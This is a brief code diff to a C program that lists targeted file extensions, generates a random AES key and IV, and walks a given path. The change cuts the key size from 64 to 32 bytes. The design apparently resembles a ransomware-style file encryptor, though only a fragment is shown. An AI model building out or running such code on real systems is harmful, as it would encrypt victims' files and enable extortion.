@@ -49,7 +49,7 @@ const char *allowedExtensions[] = {
      ".nef", ".ai", ".djvu", ".m4u", ".m3u", ".mid", ".asf", ".vob", ".fla", ".sh"
 };
 
-unsigned char encryptionKey[65];
+unsigned char encryptionKey[33];
 unsigned char iv[AES_BLOCK_SIZE];
 
 void generateRandomKey(unsigned char *key, int size) {
@@ -65,7 +65,7 @@ void printHex(const unsigned char *buffer, size_t size) {
 }
 
 int main(int argc, const char *argv[]) {
-    generateRandomKey(encryptionKey, 64);
+    generateRandomKey(encryptionKey, 32);
     generateRandomKey(iv, AES_BLOCK_SIZE);
 
     const char *path;
